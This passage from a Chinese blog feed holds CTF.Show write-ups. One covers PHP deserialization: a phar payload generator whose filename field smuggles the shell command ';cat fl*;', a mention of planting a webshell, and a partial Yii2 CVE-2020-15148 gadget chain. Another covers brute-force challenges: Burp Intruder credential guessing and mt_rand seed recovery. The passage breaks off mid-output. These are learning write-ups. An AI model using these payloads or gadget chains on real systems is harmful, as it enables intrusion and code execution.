phar.phar，然后丢到postman，设置post，内容为binary，参数fn为/var/www/html/phar.phar，发送</p><p>然后在浏览器请求参数fn为 phar://phar.phar</p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%209.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%209.png"></p><p>wow，成功，注意这里不能将ls改成flag.php，否则会被第二个正则规则过滤，你可以改成cat fl*，或者你直接插个一句话木马也是没什么所谓的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="keyword">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二次拿flag的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">filter</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;;cat fl*;&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$evilfile</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> filter();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.php&quot;</span>, <span class="string">&quot;Powered By Genshin Impact&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();    <span class="comment">//签名自动计算</span></span><br></pre></td></tr></table></figure><p>postman 设置</p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2010.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2010.png"></p><p>第二次请求 /?fn=phar://phar2.phar 右键查看源代码获取 flag</p><h2 id="其他问题-1"><a href="#其他问题-1" class="headerlink" title="其他问题"></a>其他问题</h2><blockquote><p>「你们难道就一点问题都没有的吗？」       —— TARI TARI</p></blockquote><ul><li><p>怎么打包 phar</p><p>  答：根据 <a href="https://www.iloveflag.com/2020/07/09/%E6%B5%85%E8%B0%88phar%E6%96%87%E4%BB%B6%E5%9C%A8ctf%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">https://www.iloveflag.com/2020/07/09/浅谈phar文件在ctf中的应用/</a> ，打包 phar需要经过下列代码</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    @unlink(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> Test();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.php&quot;</span>, <span class="string">&quot;&lt;?php phpinfo();&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();    <span class="comment">//签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>  由此又衍生处几个问题，包括但不限于</p><ul><li><p>为什么要设置 stub，他有什么作用吗？为什么要写 __HALT_COMPILER();？</p><p>  参考资料：<a href="https://www.webhek.com/post/packaging-your-php-apps-with-phar.html">https://www.webhek.com/post/packaging-your-php-apps-with-phar.html</a></p><blockquote><p>运行Phar文件时，stub文件被当做一个meta文件来初始化Phar， 并告诉Phar文件在被调用时该做什么。</p></blockquote><p>  打个不太恰当的比喻，可能类似于phar的入口文件吧，或者像是模板的header.php，在调用内容前可以用来执行一下前面的函数。</p><p>  同时，phar也必须加入__HALT_COMPILER();</p><blockquote><p>stub文件的结尾处需要调用 __HALT_COMPILER() 方法，这个方法后不能留空格。__HALT_COMPILER() 会立即终止PHP的运行，防止include的文件在此方法后仍然执行。这是Phar必须的，没有它Phar将不能正常运行</p></blockquote><p>  由此又衍生出一个问题</p><ul><li><p>可以在setStub时就插入file_put_contents插入一句话木马吗？</p><p>  试了一下，无论是echo “test”;还是放置1.txt，还是修改为绝对路径 /var/www/html/1.txt ，好像都不能正常插入，可能不行？</p><p>  &lt;待尝试&gt;</p></li></ul></li><li><p>为什么要设置添加其他压缩文件，它有什么用？不加可以吗</p><p>  phar本质是一个压缩文件，需要其他文件来填充。实测如果不加其他文件来压缩的话，phar文件不能被产生。</p></li><li><p>为什么要设置Metadata，为什么它能够自动反序列化</p><p>  参考资料：<a href="https://zhuanlan.zhihu.com/p/385362368">https://zhuanlan.zhihu.com/p/385362368</a></p><blockquote><p>manifest：压缩文件的属性等信息，其中的Meta-data会以序列化的形式存储。</p></blockquote><p>  也就是说，这个menifest存储的是压缩文件的属性信息，而又恰好这个metadata是以序列化的形式存储的，当对phar进行读取等操作的时候，就会将这个metadata给反序列化，自然可以调用到上文中的destruct。</p></li></ul></li></ul><h1 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h1><p><code>本题目基于 PHP7.3.11, Yii</code> 未完成</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/rfrder/article/details/113824239">https://blog.csdn.net/rfrder/article/details/113824239</a>（yii2框架 反序列化漏洞复现）</p><h2 id="本地环境搭建"><a href="#本地环境搭建" class="headerlink" title="本地环境搭建"></a>本地环境搭建</h2><p>在 Github <a href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">https://github.com/yiisoft/yii2/releases/tag/2.0.37</a> 上下载 2.0.37 版本，解压到网站目录，并将 webroot 指向 /web ，安装 composer，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -sS https:<span class="comment">//getcomposer.org/installer | php</span></span><br><span class="line">mv composer.phar /usr/local/bin/composer</span><br></pre></td></tr></table></figure><p>完成后运行 <code>composer run-script post-create-project-cmd</code></p><p>打开 yii2.local，查看是否安装成功</p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2011.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2011.png"></p><h2 id="开搞"><a href="#开搞" class="headerlink" title="开搞"></a>开搞</h2><p>参考资料：</p><ul><li><a href="https://blog.csdn.net/rfrder/article/details/113824239">https://blog.csdn.net/rfrder/article/details/113824239</a></li><li><a href="https://www.cnblogs.com/potatsoSec/p/13693969.html">https://www.cnblogs.com/potatsoSec/p/13693969.html</a></li></ul><p>对于反序列链利用我还不是很懂，所以大部分都是跟着大佬和别人的wp依葫芦画瓢，此文章仅仅是为了记录我的一次实践过程，十分感谢上述这些资料的帮助。</p><p>根据文章，反序列化反序列化，就是要用到unserialize的。不过不用急，我们先看一下 CVE-2020-15148 修复了什么。</p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2012.png" alt="Untitled"></p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2013.png" alt="Untitled"></p><p>从 <a href="https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99">https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99</a> 可以看出，对 framework/db/BatchQueryResult.php 增添了 __wakeup 用于禁止 BatchQueryResult 被反序列化，言外之意就是我们要利用这个来进行反序列化漏洞。</p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2014.png" alt="Untitled"></p><p>这个漏洞的切入点为 __destruct()（到底是怎么找到的，我也不清楚，网上也没说清楚，可能是因为在这个类没有 __call 等其他 __ 开头的方法的时候，这个是最直接有效的可使用的？）</p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2015.png" alt="Untitled"></p><p>它调用了reset()，而 reset() 又调用了 close(); ，其中此处的判断条件又仅仅是判断是否为 null。</p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2016.png" alt="Untitled"></p><p>又因为反序列化中，其变量其实都是可控的，也就是说我们可以继续在此处放入一个任意的对象调用close()，只要它有 __call 就可以调用它了。</p><p>全文搜索 <em>call ，发现一个较为合适的注入点 /verdor/fzaninotto/faker/src/Faker/Generator.php（为什么这里较为合适，是因为后面 format 还调用了 call_user_func_array吗？</em>）</p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2017.png" alt="Untitled"></p><p>为了了解到直接调用 →close(); 会发生什么，这里写一个简单的程序来展示一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$param</span></span>) </span>&#123;</span><br><span class="line">            print_r(<span class="variable">$method</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> A();</span><br><span class="line">    <span class="variable">$b</span>-&gt;close(<span class="number">1</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>最终输出结果为 close Array ( [0] =&gt; 1 [1] =&gt; 2 )，也就是说close被当成第一个参数 method 被传进去了，而 close 中的参数被传入 param 中，为一个数组。</p><p>我们再回来看这里的 __call ，调用了一个 format，巧了吗不是，format中call_user_func_array能被利用，我们再看这个 getFormatter 到底执行了什么</p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2018.png" alt="Untitled"></p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2019.png" alt="Untitled"></p><p>反序列化嘛，这么个变量我还治不了你？也就是说， call_user_func_array 的第一个参数我们是可以自行控制的。但不行啊，arguments我们控制不了啊，怎么办呢，那我们调用另一个对象的方法呗，反正$this→getFormatter($formatter)是可控的，没说这里必须要填个string吧？</p><p>使用正则表达式 <code>function .*\(\)\n?\ \&#123;(.\n.*)+call_user_func\(\$this</code> （这里最后的$this存粹就是为了图方便，毕竟可以直接构造对象）在PHPStorm中查找，我们可以发现有一个符合条件的。</p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%2020.png" alt="Untitled"></p><p>两个可控，香饽饽，文件在 <code>/rest/CreateAction.php</code> 下</p><p>到这里，反序列化链就已经结束了。流程即为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/db/BatchQueryResult.php:<span class="number">79</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>;</span><br><span class="line"><span class="number">1</span>. BatchQueryResult() -&gt; __destruct()</span><br><span class="line">-&gt; reset()</span><br><span class="line">-&gt; <span class="keyword">$this</span>-&gt;_dataReader-&gt;close()</span><br><span class="line"><span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> Faker();</span><br><span class="line"></span><br><span class="line">*/verdor/fzaninotto/faker/src/Faker/<span class="built_in">Generator</span>.php:<span class="number">283</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>;*</span><br><span class="line"><span class="number">2</span>. Faker() -&gt; __call() <span class="comment">// 通过 $this-&gt;_dataReader-&gt;close() 调用</span></span><br><span class="line"> -&gt; <span class="keyword">$this</span>-&gt;format()</span><br><span class="line"> -&gt; call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter(<span class="variable">$formatter</span>))</span><br><span class="line"><span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>(close)] = <span class="keyword">new</span> CreateAction();</span><br><span class="line"></span><br><span class="line">/vendor/yiisoft/yii2/rest/CreateAction:<span class="number">40</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>;</span><br><span class="line"><span class="number">3</span>. CreateAction() -&gt; run()</span><br><span class="line"><span class="keyword">$this</span>-&gt;checkAccess</span><br><span class="line"><span class="keyword">$this</span>-&gt;id</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;web254&quot;&gt;&lt;a href=&quot;#web254&quot; class=&quot;headerlink&quot; title=&quot;web254&quot;&gt;&lt;/a&gt;web254&lt;/h1&gt;&lt;p&gt;&lt;code&gt;本题目基于 PHP7.3.11&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;做法&quot;&gt;&lt;a href=&quot;#做法&quot; class=&quot;headerlink&quot; title=&quot;做法&quot;&gt;&lt;/a&gt;做法&lt;/h2&gt;&lt;p&gt;草，我一开始还以为username要用对象传进去，原来那个xxxxxx就是，那没事了。&lt;/p&gt;
&lt;p&gt;直接访问 /?username=xxxxxx&amp;amp;password=xxxxxx 即可&lt;/p&gt;</summary>
    
    
    
    <category term="技术篇" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    <category term="CTF" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>【Klee-CTF】CTF.Show Web入门 爆破 web21~web28</title>
    <link href="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-blasting.html"/>
    <id>https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-blasting.html</id>
    <published>2021-08-30T04:00:00.000Z</published>
    <updated>2021-08-30T12:28:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h1><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>首先先打开浏览器发送一次 HTTP 认证请求并抓包，将请求发送给 Intruder，并将此处添加为 payload</p><span id="more"></span><p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled.png" alt="Untitled"></p><p>进入payloads标签页，将 Payload type 修改为 Custom iterator，在 Position 1 处填入 admin: ，在Position 2 处点击Add from list… 并选择 Passwords</p><p>然后在 Payload Processing 中加入 Base64 Encode</p><p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%201.png" alt="Untitled"></p><p>注意：要记得把 Payload Encoding 中的 URL-encode 给去除掉，否则会出现把=给编码的情况。我们可以看上面，=号是没有被编码的，编码将会导致传到服务器后无法进行base64 decode。</p><p>设置完毕点击 Start Attack，喝杯 Jvav</p><p>然后我重复扫了两次，发现扫不出来。。。。<del>然后查了一下其他同学的writeup发现密码是123456</del></p><p><del>然后我翻了翻burpsuite的passwords，他竟然没有123456？？？？？？？</del></p><p>原来是题目里面就有一个密码字典。。大意了，赶紧点开下载</p><p>然后在 Filter 里面隐藏400请求结果，等待200结果出现即可拿到flag</p><p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%202.png" alt="Untitled"></p><h1 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h1><h2 id="做题-1"><a href="#做题-1" class="headerlink" title="做题"></a>做题</h2><p>使用 OneForAll 扫描，命令为 <code>python3 [oneforall.py](http://oneforall.py/) --target ctf.show run</code> </p><p>排除上述 challenges 的结果后，最终可以在 <a href="http://vip.ctf.show/">vip.ctf.show</a> 的title中看到flag</p><h1 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h1><h2 id="做题-2"><a href="#做题-2" class="headerlink" title="做题"></a>做题</h2><p>没思路</p><p>虽然但是，我们可以将爆破转换到本地来进行，反正有代码了，节省了上下行时间，改造一下？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//include(&#x27;flag.php&#x27;);</span></span><br><span class="line"><span class="comment">//if(isset($_GET[&#x27;token&#x27;]))&#123;</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$count</span> = <span class="number">0</span>; <span class="variable">$count</span> &lt;= <span class="number">1000</span>; <span class="variable">$count</span>++) &#123; <span class="comment">// 改造为for循环，没想到1000次就够了</span></span><br><span class="line">    <span class="variable">$token</span> = md5(<span class="variable">$count</span>);</span><br><span class="line">    <span class="keyword">if</span>(</span><br><span class="line">        substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>) === substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>)</span><br><span class="line">        &amp;&amp; substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(</span><br><span class="line">            (</span><br><span class="line">                intval(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))</span><br><span class="line">                + intval(substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))</span><br><span class="line">                + substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>)</span><br><span class="line">            ) / substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>) === intval(substr(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>))</span><br><span class="line">        )&#123;</span><br><span class="line"><span class="comment">//            echo $flag;</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$count</span> . <span class="string">&quot; &quot;</span>; <span class="comment">// 输出结果</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//else&#123;</span></span><br><span class="line"><span class="comment">//    highlight_file(__FILE__);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>光看条件肯定是做不出的，最后跑一遍php就可以出了，肯定有很多答案，1000以内存在一个422的答案能拿到flag。</p><h1 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li>mt_rand 的伪随机数</li></ul><h2 id="做题-3"><a href="#做题-3" class="headerlink" title="做题"></a>做题</h2><p>参考资料：<a href="https://blog.csdn.net/crisprx/article/details/104306971">https://blog.csdn.net/crisprx/article/details/104306971</a></p><p>将代码复制下来，并将mt_rand 赋值给一个变量，断点调试观察到，无论刷新几次，该值都不会变化，实际上该值仅与 mt_rand() 被调用的次数有关，我们把断点调试拿到的这个值 1155388967 作为参数 r 拿到flag。</p><p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%203.png" alt="Untitled"></p><h1 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h1><p><code>PHP Version: 7.3.11</code></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:56:57</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 15:47:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(hexdec(substr(md5(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = intval(<span class="variable">$r</span>)-intval(mt_rand());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>; <span class="comment">// 此处可获得 rand 的相反数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="做题-4"><a href="#做题-4" class="headerlink" title="做题"></a>做题</h2><p>首先输入r=0获取其第一个mt_rand的值的相反数，比如我们此处获得 -769757407 ，然后将r的值设为769757407，返回空白页即进入下一步。</p><p><img data-src="CTF-Show-Get-Started-with-the-web-blasting/Untitled%204.png" alt="Untitled"></p><p>可以考虑从随机数反推种子，参考资料<a href="https://blog.csdn.net/weixin_30271335/article/details/95240888">https://blog.csdn.net/weixin_30271335/article/details/95240888</a></p><p>我们可以利用 php-mt-seed 来反推。执行下面命令，可以得到以下结果（由于ctfshow超时了，导致重新分配了一个种子）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">php-mt-seed <span class="number">227011223</span></span><br><span class="line"></span><br><span class="line">Pattern: EXACT</span><br><span class="line">Version: <span class="number">3.0</span>.<span class="number">7</span> to <span class="number">5.2</span>.<span class="number">0</span></span><br><span class="line">Found <span class="number">0</span>, trying <span class="number">0x84000000</span> - <span class="number">0x87ffffff</span>, speed <span class="number">4814.3</span> Mseeds/s</span><br><span class="line">seed = <span class="number">0x84d77ec4</span> = <span class="number">2228715204</span> (PHP <span class="number">3.0</span>.<span class="number">7</span> to <span class="number">5.2</span>.<span class="number">0</span>)</span><br><span class="line">seed = <span class="number">0x84d77ec5</span> = <span class="number">2228715205</span> (PHP <span class="number">3.0</span>.<span class="number">7</span> to <span class="number">5.2</span>.<span class="number">0</span>)</span><br><span class="line">Found <span class="number">2</span>, trying <span class="number">0xc0000000</span> - <span class="number">0xc3ffffff</span>, speed <span class="number">4880.6</span> Mseeds/s</span><br><span class="line">seed = <span class="number">0xc13ba64a</span> = <span class="number">3241911882</span> (PHP <span class="number">3.0</span>.<span class="number">7</span> to <span class="number">5.2</span>.<span class="number">0</span>)</span><br><span class="line">seed = <span class="number">0xc13ba64b</span> = <span class="number">3241911883</span> (PHP <span class="number">3.0</span>.<span class="number">7</span> to <span class="number">5.2</span>.<span class="number">0</span>)</span><br><span class="line">Found <span class="number">4</span>, trying <span class="number">0xfc000000</span> - <span class="number">0xffffffff</span>, speed <span class="number">4916.1</span> Mseeds/s</span><br><span class="line">Version: <span class="number">5.2</span>.<span class="number">1</span>+</span><br><span class="line">Found <span class="number">4</span>, trying <span class="number">0x2a000000</span> - <span class="number">0x2bffffff</span>, speed <span class="number">44.5</span> Mseeds/s</span><br><span class="line">seed = <span class="number">0x2b444473</span> = <span class="number">725894259</span> (PHP <span class="number">7.1</span>.<span class="number">0</span>+)</span><br><span class="line">Found <span class="number">5</span>, trying <span class="number">0x38000000</span> - <span class="number">0x39ffffff</span>, speed <span 